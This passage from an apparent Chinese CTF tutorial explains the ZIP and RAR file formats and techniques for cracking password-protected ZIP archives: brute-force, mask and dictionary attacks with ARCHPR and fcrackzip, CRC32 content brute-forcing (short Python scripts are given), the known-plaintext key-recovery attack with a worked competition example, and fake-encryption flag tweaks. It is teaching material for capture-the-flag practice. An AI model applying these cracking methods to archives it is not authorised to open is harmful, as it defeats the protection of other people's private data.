(n)</td><td>文件名长度</td></tr><tr><td>30</td><td>2</td><td>Extra field length (m)</td><td>扩展域长度</td></tr><tr><td>32</td><td>2</td><td>File comment length (k)</td><td>文件注释长度</td></tr><tr><td>34</td><td>2</td><td>Disk number where file starts</td><td>文件开始位置的磁盘编号</td></tr><tr><td>36</td><td>2</td><td>Internal file attributes</td><td>内部文件属性</td></tr><tr><td>38</td><td>4</td><td>External file attributes</td><td>外部文件属性</td></tr><tr><td>42</td><td>4</td><td>relative offset of local header</td><td>本地文件头的相对位移</td></tr><tr><td>46</td><td>n</td><td>File name</td><td>目录文件名</td></tr><tr><td>46+n</td><td>m</td><td>Extra field</td><td>扩展域</td></tr><tr><td>46+n+m</td><td>k</td><td>File comment</td><td>文件注释内容</td></tr></tbody></table></li></ul></li><li><p><code>End of central directory record(EOCD)</code> 目录结束标识</p><ul><li>目录结束标识存在于整个归档包的结尾，用于标记压缩的目录数据的结束。每个压缩文件必须有且只有一个 <code>EOCD</code> 记录。</li></ul></li></ul><p>更加详细参见 <a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">官方文档</a>。</p><h3 id="ZIP数据结构"><a href="#ZIP数据结构" class="headerlink" title="ZIP数据结构"></a>ZIP数据结构</h3><h4 id="压缩源文件数据区"><a href="#压缩源文件数据区" class="headerlink" title="压缩源文件数据区"></a>压缩源文件数据区</h4><table><thead><tr><th>数据</th><th>含义</th></tr></thead><tbody><tr><td>50 4B 03 04</td><td>这是头文件标记（0x04034b50）</td></tr><tr><td>14 00</td><td>解压文件所需 pkware 版本</td></tr><tr><td>00 00</td><td>全局方式位标记（有无加密）</td></tr><tr><td>08 00</td><td>压缩方式</td></tr><tr><td>5A 7E</td><td>最后修改文件时间</td></tr><tr><td>F7 46</td><td>最后修改文件日期</td></tr><tr><td>16 B5 80 14</td><td>CRC-32校验（1480B516）</td></tr><tr><td>19 00 00 00</td><td>压缩后尺寸（25）</td></tr><tr><td>17 00 00 00</td><td>未压缩尺寸（23）</td></tr><tr><td>07 00</td><td>文件名长度</td></tr><tr><td>00 00</td><td>扩展记录长度</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210903151348.png"></p><h4 id="核心目录区"><a href="#核心目录区" class="headerlink" title="核心目录区"></a>核心目录区</h4><table><thead><tr><th>数据</th><th>含义</th></tr></thead><tbody><tr><td>50 4B 01 02</td><td>目录中文件文件头标记(0x02014b50)</td></tr><tr><td>3F 00</td><td>压缩使用的 pkware 版本</td></tr><tr><td>14 00</td><td>解压文件所需 pkware 版本</td></tr><tr><td>00 00</td><td>全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</td></tr><tr><td>08 00</td><td>压缩方式</td></tr><tr><td>5A 7E</td><td>最后修改文件时间</td></tr><tr><td>F7 46</td><td>最后修改文件日期</td></tr><tr><td>16 B5 80 14</td><td>CRC-32校验（1480B516）</td></tr><tr><td>19 00 00 00</td><td>压缩后尺寸（25）</td></tr><tr><td>17 00 00 00</td><td>未压缩尺寸（23）</td></tr><tr><td>07 00</td><td>文件名长度</td></tr><tr><td>24 00</td><td>扩展字段长度</td></tr><tr><td>00 00</td><td>文件注释长度</td></tr><tr><td>00 00</td><td>磁盘开始号</td></tr><tr><td>00 00</td><td>内部文件属性</td></tr><tr><td>20 00 00 00</td><td>外部文件属性</td></tr><tr><td>00 00 00 00</td><td>局部头部偏移量</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210903151540.png"></p><h4 id="压缩源文件目录结束标志"><a href="#压缩源文件目录结束标志" class="headerlink" title="压缩源文件目录结束标志"></a>压缩源文件目录结束标志</h4><table><thead><tr><th>数据</th><th>含义</th></tr></thead><tbody><tr><td>50 4B 05 06</td><td>目录结束标记</td></tr><tr><td>00 00</td><td>当前磁盘编号</td></tr><tr><td>00 00</td><td>目录区开始磁盘编号</td></tr><tr><td>01 00</td><td>本磁盘上纪录总数</td></tr><tr><td>01 00</td><td>目录区中纪录总数</td></tr><tr><td>59 00 00 00</td><td>目录区尺寸大小</td></tr><tr><td>3E 00 00 00</td><td>目录区对第一张磁盘的偏移量</td></tr><tr><td>00 00</td><td>ZIP 文件注释长度</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210903163943.png"></p><h3 id="主要攻击"><a href="#主要攻击" class="headerlink" title="主要攻击"></a>主要攻击</h3><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>这里主要介绍两款爆破使用的工具</p><ul><li><code>Windows</code>下的神器 <a href="http://www.downcc.com/soft/130539.html">ARCHPR</a></li></ul><p>   <img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210905194927.png" alt="ARCHPR"></p><ul><li><code>Linux</code> 下的命令行工具 <a href="https://github.com/hyc/fcrackzip">fcrackzip</a></li></ul><h5 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h5><p>作为最普通的密码攻击手段，ARCHPR允许在范围选项卡中，选择暴力破解的字符集：</p><p>其中”所有特殊符号”为：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>@<span class="token comment">#$%^&amp;*()_+-=&lt;>,./?[]&#123;&#125;~:;`'|"\</span></code></pre><p>此外，可以自定义字符集：通过勾选用户定义，然后点击右边的”自定义字符集”选项</p><p>如你所见，在给定的字符集中，只囊括了ASCII可打印字符，如果 .zip 的密码是中文的话，那就必须选择”自定义字符集”，并且勾选转换为OEM编码；否则密码会”Not Found”</p><ul><li><p>在长度选项卡中，设置密码长度：</p></li><li><p>在范围选项卡的右边，可以看到：开始于、结束于</p></li></ul><p>这里就得知道，ARCHPR在暴力破解密码的时候，是采用特定的顺序的：</p><ul><li>大小字母 A - Z</li><li>空格</li><li>小写字母 a - z</li><li>数字 0 - 9</li><li>特殊字符 !@#$ …<br>也就是说，暴力破解密码的顺序大致为：</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token string">"AAA"</span> -<span class="token operator">></span> <span class="token string">"AAB"</span> -<span class="token operator">></span> <span class="token string">"AAC"</span> -<span class="token operator">></span> <span class="token punctuation">..</span>. -<span class="token operator">></span> <span class="token string">"AAZ"</span> -<span class="token operator">></span> <span class="token string">"AA "</span> -<span class="token operator">></span> <span class="token string">"AAa"</span> -<span class="token operator">></span> <span class="token string">"AAb"</span> -<span class="token operator">></span> <span class="token punctuation">..</span>. -<span class="token operator">></span> <span class="token string">"AAz"</span> -<span class="token operator">></span> <span class="token string">"AA0"</span> -<span class="token operator">></span> <span class="token string">"AA1"</span> -<span class="token operator">></span> <span class="token punctuation">..</span>. -<span class="token operator">></span> <span class="token string">"AA9"</span> -<span class="token operator">></span> <span class="token string">"AA!"</span> -<span class="token operator">></span> <span class="token string">"AA@"</span></code></pre><p>上图的”开始于”有2个作用：</p><p>当你知道密码长度为5，并且第一个字符为 k，你可以在”开始于”设置<code>kAAAA</code>，那么ARCHPR将跳过<code>AAAAA</code>到<code>kAAAA</code>的前一个的暴力破解，节省时间<br>如果破解密码的时间太长，ARCHPR会每隔5分钟自动保存密码（在自动保存选项卡中可以选择），如果某次暴力破解被迫中断，那么可以通过查看最后一次保存的密码，并设置”开始于”，直接从上次爆破的地方继续开始爆破<br>“结束于”的作用类似</p><h6 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h6><p>在这里，引出ARCHPR的第一个坑：</p><p>我们尝试用ARCHPR暴力破解出 的密码，结果却显示：<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906112305.png"><br>出现这个报错是因为.zip 的压缩算法是有版本的，ARCHPR不支持较高压缩版本的 .zip，所以这个时候可以使用fcrackzip进行爆破</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906135631.png"></p><h5 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h5><p>掩码攻击属于局部暴力破解，如果你已经知道部分的密码，那么可以直接输入它，再用<code>?</code>来代替那些不知道的部分；随后ARCHPR就会爆破<code>?</code>处的字符</p><p>注意掩码攻击是固定长度的</p><p>比如我知道密码的长度为7，后4位是<code>love</code>，那么就可以在掩码处填入<code>???love</code></p><p>确定掩码后，爆破方式与暴力破解没什么不同</p><p>如果密码本身就可能包含<code>?</code>，那可以在高级选项卡中，更改默认的掩码符号<code>?</code></p><h6 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h6><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906153540.png"></p><h5 id="字典攻击"><a href="#字典攻击" class="headerlink" title="字典攻击"></a>字典攻击</h5><p>字典相比较暴力破解更”智能”，因为字典中包含了大部分可能使用的密码，而不是毫无头绪的穷尽遍历</p><p>一份好的字典是必须的，字典囊括的密码数决定了字典攻击的效果</p><blockquote><p>比如Github上就有许多爆破字典：<a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a></p></blockquote><p>ARCHPR为字典攻击提供了3个选项：</p><ul><li><p>智能变化</p><p>  “智能变化”是针对字典元素的：假如当字典攻击到 password 时，ARCHPR会自动将 password 进行变化：</p><p>  PASSword、passWORD、全小写 password、全大写 PASSWORD、首字母大写 Password、首字母小写 pASSWORD、元音字母大写 pAsswOrd、元音字母小写 PaSSWoRD、间隔变化1 PaSsWoRd、间隔变化2 pAsSwOrD</p><p>  对于字典中的每个元素，都会执行上面10种变化，增大破解几率，但破解时间会增大10倍</p></li><li><p>尝试所有可能的大&#x2F;小写组合</p><p>  以字典元素 password 为例，ARCHPR会依次尝试每个字母的大小写组合：</p><p>  password -&gt; passworD -&gt; passwoRd -&gt; passwoRD -&gt; … -&gt; PASSWORD</p></li></ul><p>很显然，这种情况下破解时间会大幅增加</p><ul><li><p>转换为OEM编码</p><p>  当字典元素不只包含拉丁字母(Latin Letters)时，这个选项才会生效</p></li></ul><h6 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h6><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210907101221.png"></p><h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><p>有些时候出题人会把密码直接放到注释里面，注意一下就好</p><h6 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h6><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210907102155.png"><br>这里题目中就在注释里隐藏了摩斯电码</p><h6 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h6><p>除了这种明文的注释，还有一种比较流氓的注释，会把注释进行反色或者利用tab和空格制造摩斯电码<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210907104933.png"></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210907145728.png"></p><h4 id="CRC32"><a href="#CRC32" class="headerlink" title="CRC32"></a>CRC32</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><code>CRC</code> 本身是「冗余校验码」的意思，<code>CRC32</code> 则表示会产生一个 <code>32 bit</code> ( <code>8</code>  位十六进制数)的校验值。由于 <code>CRC32</code> 产生校验值时源数据块的每一个 <code>bit</code> (位)都参与了计算，所以数据块中即使只有一位发生了变化，也会得到不同的 <code>CRC32</code> 值。</p><p><code>CRC32</code> 校验码出现在很多文件中比如 <code>png</code> 文件，同样 <code>zip</code> 中也有 <code>CRC32</code> 校验码。值得注意的是 <code>zip</code> 中的 <code>CRC32</code> 是未加密文件的校验值。</p><p>这也就导致了基于 <code>CRC32</code> 的攻击手法。</p><ul><li>文件内内容很少(一般比赛中大多为 <code>4</code> 字节左右)</li><li>加密的密码很长</li></ul><p>我们不去爆破压缩包的密码，而是直接去爆破源文件的内容(一般都是可见的字符串)，从而获取想要的信息。</p><p>比如我们新建一个 <code>flag.txt</code>，其中内容为 <code>123</code>，使用密码 <code>!QAZXSW@#EDCVFR$</code> 去加密。</p><p>!!! note<br>​    在爆破时我们所枚举的所有可能字符串的 <code>CRC32</code> 值是要与压缩源文件数据区中的 <code>CRC32</code> 值所对应</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> binascii<span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token keyword">import</span> itertools<span class="token keyword">import</span> structalph <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='</span>crcdict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span> <span class="token string">"computing all possible CRCs..."</span><span class="token keyword">for</span> x <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>alph<span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    st <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    testcrc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>st<span class="token punctuation">)</span>    crcdict<span class="token punctuation">[</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;i'</span><span class="token punctuation">,</span> testcrc<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> st<span class="token keyword">print</span> <span class="token string">"Done!"</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.zip'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>crc <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> crc <span class="token keyword">in</span> crcdict<span class="token punctuation">:</span>    <span class="token keyword">print</span> crcdict<span class="token punctuation">[</span>crc<span class="token punctuation">]</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"FAILED!"</span></code></pre><h5 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h5><p>根据每个压缩包内的文件大小可以推断使用 <code>CRC32</code> 攻击手法，获得每个压缩包内的内容后连在一起 <code>Base64</code> 解码后是一个加密的压缩包，爆破获得 <code>flag</code>。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210905195800.png" alt="20210905195800"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> string<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">CrackCrc</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">for</span> p <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                <span class="token keyword">for</span> q <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                    s <span class="token operator">=</span> i <span class="token operator">+</span> j <span class="token operator">+</span> p <span class="token operator">+</span> q                    <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token comment">#print s</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                        <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">CrackZip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> I <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'flag'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">'.zip'</span>        f <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        GetCrc <span class="token operator">=</span> f<span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.txt'</span><span class="token punctuation">)</span>        crc <span class="token operator">=</span> GetCrc<span class="token punctuation">.</span>CRC        <span class="token comment">#以上3行为获取压缩包CRC32值的步骤</span>        <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span>        CrackCrc<span class="token punctuation">(</span>crc<span class="token punctuation">)</span>dic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'&#123;&#125;_+/='</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>CrackZip<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210905201011.png" alt="20210905201011"></p><h4 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><ul><li><p>.zip 传统加密算法本质上是<code>伪随机数流</code>和<code>明文</code>进行异或，产生这个伪随机流需要用到3个32 bits的key；<code>找到这3个key，就能解开加密的文件</code></p></li><li><p>压缩软件用这3个key加密压缩包中的所有文件，当我们得到已加密压缩包中的任意一个文件，如果我们用同样的压缩方法进行无密码的压缩，得到的无密码 .zip 和有密码的 .zip 进行比较，分析两个文件的不同点，就能得到3个key了</p></li><li><p>所谓明文是指我们通过某些方法得到的已经加密的 .zip 文件中的部分文件</p></li><li><p>用相同的压缩方法将该明文压缩成 .zip在拥有2个 .zip 文件后，由于新的 .zip 和原本的 .zip 用同样的压缩方法放置入了至少1个相同的文件，那么就能够根据新的 .zip 爆破出压缩密码</p></li><li><p>明文需大于12 bytes</p></li></ul><p>如果你已经知道加密文件的部分内容，比如在某个网站上发现了它的 <code>readme.txt</code> 文件，你就可以开始尝试破解了。</p><p>首先，将这个明文文件打包成 <code>zip</code> 包，比如将 <code>readme.txt</code> 打包成 <code>readme.zip</code> 。</p><p>打包完成后，需要确认二者采用的压缩算法相同。一个简单的判断方法是用 <code>WinRAR</code> 打开文件，同一个文件压缩后的体积是否相同。如果相同，基本可以说明你用的压缩算法是正确的。如果不同，就尝试另一种压缩算法。</p><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ul><li>Windows下的神器 <a href="http://www.downcc.com/soft/130539.html">ARCHPR</a></li></ul><h5 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h5><blockquote><p>2015广州强网杯：爆破？</p><p>WP：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html</a></p></blockquote><p>首先我们拿到这样一道题，题目标题为**爆破?**，很明显这题肯定是要用到一个破解工具，很暴力的说。</p><p><strong>第一步、分析压缩包文件</strong></p><p>我们下载了这个压缩包以后，我们看到文件名是 ***.zip** 结尾，我们可以立即想到破解压缩包常用的几种方式，我们将其压缩包解压出来，发现里面有两个文件，分别为 <code>Desktop.zip</code> 和 <code>readme.txt</code> ，我们看看 <code>readme.txt</code> 里面写了什么？</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906092945.png" alt="readme"><br>打开以后竟然是<code>qianwanbuyaogeixuanshoukandao!!!</code> ，出题人不想让选手看到，这出题人还是有点意思。我们再看看那个 <code>Desktop.zip</code> ，我们可以看到里面有个 <code>readme.txt</code> 文件和 <code>answer</code> 文件夹， <code>answer</code> 文件夹下有 <code>key.txt</code> 文件， <code>flag</code> 应该就藏在这里了。</p><p><strong>第二步、分析破解方式</strong></p><p>这题目拿到手上，我们首先发现解压出来的文件和 <code>Desktop.zip</code> 压缩包中都含有同样一个文件 <code>readme.txt</code> ，而且并没有给出其他相关信息，且文件大小大于 <code>12Byte</code> ，我们再对比压缩包中的 <code>readme.txt</code> 和原压缩包中的 <code>readme.txt</code> 的 <code>CRC32</code> 的值，我们发现两个值相同，这说明解压出的 <code>readme.txt</code> 是加密压缩包里的 <code>readme.txt</code> 的明文，于是我们可以大胆地猜测这极可能是个明文加密。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906104323.png" alt="20210906104323"></p><p><strong>第三步、尝试明文攻击</strong></p><p>既然我们已经知道了它是明文攻击的话，我们将对其压缩包进行破解，由于解压出的readme.txt是加密压缩包里的 <code>readme.txt</code> 的明文，将 <code>readme.txt</code> 压缩成 <strong>.zip</strong> 文件，然后在软件中填入相应的路径即可开始进行明文攻击。</p><p><strong>坑点来了</strong><br>在使用明文攻击的时候，经常会出现这种报错，那是题目不是用明文攻击吗？并不是的<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906110144.png" alt="20210906110144"></p><p>构造明文压缩包时要选用与加密压缩包相同的压缩软件，如果他<code>WinRar</code>压的，你用<code>7z</code>构造出的压缩包来做明文压缩包，软件是会报错的</p><p><strong>再尝试</strong></p><p>我们已经发现了这个问题，我们去官网下载 <code>7zip</code> ：<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p><p>然后我们对原压缩文件用 <code>7z</code> 进行解压缩，然后将 <code>readme.txt</code> 用7z进行压缩即可。然后我们就可以用 <code>ARCHPR</code> 进行明文攻击了。</p><p><strong>又一个坑点</strong></p><p>明文攻击</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906102641.png" alt="20210906102641"></p><p>这里我们看到爆破需要将近两个小时，如果你非常有耐心，爆破完成之后你会看到这个：</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906110544.png" alt="20210906110544"></p><p>口令未找到，到这里你可能会觉得明文攻击失败了，其实并没有，可以看到软件提示<code>加密密钥已成功恢复！</code></p><blockquote><p>关于zip的加密原理需要知道的是：.zip 的加密过程中会生成3个key(加密密钥)，如果我们能够得到key，那么哪怕没有密码，也能够通过明文和key复现出加密压缩包中的文件</p></blockquote><p>在使用明文攻击的时候不妨在结束阶段二后就停止攻击，打开保存下来的 .zip 文件，就能得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210906111208.png" alt="20210906111208"><br>我们将 <code>Desktop_decrypted.zip</code> 解压出来，查看 <code>answer</code> 目录下的 <code>key.txt</code> 即可。</p><p>所以最终的flag为：**<code>flag&#123;7ip_Fi13_S0m3tim3s_s0_3a5y@&#125;</code>**</p><h4 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>在上文 <code>ZIP</code> 格式中的 <strong>核心目录区</strong> 中，我们强调了一个叫做通用位标记 <code>(General purpose bit flag)</code> 的 <code>2</code> 字节，不同比特位有着不同的含义。</p><pre class="language-bash" data-language="bash"><code class="language-bash">Bit <span class="token number">0</span>: If set, indicates that the <span class="token function">file</span> is encrypted.<span class="token punctuation">(</span>For Method <span class="token number">6</span> - Imploding<span class="token punctuation">)</span>Bit <span class="token number">1</span>: If the compression method used was <span class="token builtin class-name">type</span> <span class="token number">6</span>,     Imploding, <span class="token keyword">then</span> this bit, <span class="token keyword">if</span> set, indicates     an 8K sliding dictionary was used.  If clear,     <span class="token keyword">then</span> a 4K sliding dictionary was used.<span class="token punctuation">..</span>.Bit <span class="token number">6</span>: Strong encryption.  If this bit is set, you should     <span class="token builtin class-name">set</span> the version needed to extract value to at least     <span class="token number">50</span> and you must also <span class="token builtin class-name">set</span> bit <span class="token number">0</span>.  If AES encryption     is used, the version needed to extract value must     be at least <span class="token number">51</span>.<span class="token punctuation">..</span>.</code></pre><p>修改伪加密的方法：</p><ul><li><code>16</code> 进制下修改通用位标记</li><li><code>binwalk -e</code> 无视伪加密</li><li>在 <code>Mac OS</code> 及部分 <code>Linux</code>(如 <code>Kali</code> )系统中，可以直接打开伪加密的 <code>ZIP</code> 压缩包</li><li>检测伪加密的小工具 <code>ZipCenOp.jar</code></li><li>有时候用 <code>WinRar</code> 的修复功能（此方法有时有奇效，不仅针对伪加密）</li></ul><blockquote><p>ZipCenOp.zip 对正常加密的 .zip 压缩包会直接修改所有加密位为偶数，虽然会让ZIP压缩软件显示”未加密”，但往往 .zip 文件也损坏了，得到”CRC校验错误”的结果</p></blockquote><p>所以如果拿到加密了的 .zip 文件，还是建议用十六进制编辑器打开，将加密位手动改回偶数；如果发现损坏了，则证明不是伪加密，再把加密位改回，尝试其它办法</p><p>可以比对数据区和目录区的加密位，伪加密往往只会修改目录区的加密位（因为这样就能起到效果），而正常的加密会同时修改两者的加密位<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210907174025.png" alt="20210907174025"><br>如果出题人把两处的加密位都修改了，那只好一一尝试了</p><h2 id="Rar类"><a href="#Rar类" class="headerlink" title="Rar类"></a>Rar类</h2><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><p>RAR 文件主要由标记块，压缩文件头块，文件头块，结尾块组成。</p><p>其每一块大致分为以下几个字段：</p><table><thead><tr><th>名称</th><th>大小</th><th>描述</th></tr></thead><tbody><tr><td>HEAD_CRC</td><td>2</td><td>全部块或块部分的CRC</td></tr><tr><td>HEAD_TYPE</td><td>1</td><td>块类型</td></tr><tr><td>HEAD_FLAGS</td><td>2</td><td>阻止标志</td></tr><tr><td>HEAD_SIZE</td><td>2</td><td>块大小</td></tr><tr><td>ADD_SIZE</td><td>4</td><td>可选字段 - 添加块大小</td></tr></tbody></table><p>Rar压缩包的文件头为 <code>0x 52 61 72 21 1A 07 00</code>。</p><p>紧跟着文件头（0x526172211A0700）的是标记块（MARK_HEAD），其后还有文件头（File Header）。</p><table><thead><tr><th>名称</th><th>大小</th><th>描述</th></tr></thead><tbody><tr><td>HEAD_CRC</td><td>2</td><td>CRC of fields from HEAD_TYPE to FILEATTR and file name</td></tr><tr><td>HEAD_TYPE</td><td>1</td><td>Header Type: 0x74</td></tr><tr><td>HEAD_FLAGS</td><td>2</td><td>Bit Flags (Please see ‘Bit Flags for File in Archive’ table for all possibilities)（伪加密）</td></tr><tr><td>HEAD_SIZE</td><td>2</td><td>File header full size including file name and comments</td></tr><tr><td>PACK_SIZE</td><td>4</td><td>Compressed file size</td></tr><tr><td>UNP_SIZE</td><td>4</td><td>Uncompressed file size</td></tr><tr><td>HOST_OS</td><td>1</td><td>Operating system used for archiving (See the ‘Operating System Indicators’ table for the flags used)</td></tr><tr><td>FILE_CRC</td><td>4</td><td>File CRC</td></tr><tr><td>FTIME</td><td>4</td><td>Date and time in standard MS DOS format</td></tr><tr><td>UNP_VER</td><td>1</td><td>RAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.)</td></tr><tr><td>METHOD</td><td>1</td><td>Packing method (Please see ‘Packing Method’ table for all possibilities</td></tr><tr><td>NAME_SIZE</td><td>2</td><td>File name size</td></tr><tr><td>ATTR</td><td>4</td><td>File attributes</td></tr><tr><td>HIGH_PACK_SIZ</td><td>4</td><td>High 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set.</td></tr><tr><td>HIGH_UNP_SIZE</td><td>4</td><td>High 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set.</td></tr><tr><td>FILE_NAME</td><td>NAME_SIZE bytes</td><td>File name - string of NAME_SIZE bytes size</td></tr><tr><td>SALT</td><td>8</td><td>present if (HEAD_FLAGS &amp; 0x400) !&#x3D; 0</td></tr><tr><td>EXT_TIME</td><td>variable size</td><td>present if (HEAD_FLAGS &amp; 0x1000) !&#x3D; 0</td></tr></tbody></table><p>每个 RAR 文件的结尾快（Terminator）都是固定的。</p><table><thead><tr><th>Field Name</th><th>Size (bytes)</th><th>Possibilities</th></tr></thead><tbody><tr><td>HEAD_CRC</td><td>2</td><td>Always 0x3DC4</td></tr><tr><td>HEAD_TYPE</td><td>1</td><td>Header type: 0x7b</td></tr><tr><td>HEAD_FLAGS</td><td>2</td><td>Always 0x4000</td></tr><tr><td>HEAD_SIZE</td><td>2</td><td>Block size &#x3D; 0x0007</td></tr></tbody></table><p>更多详见 <a 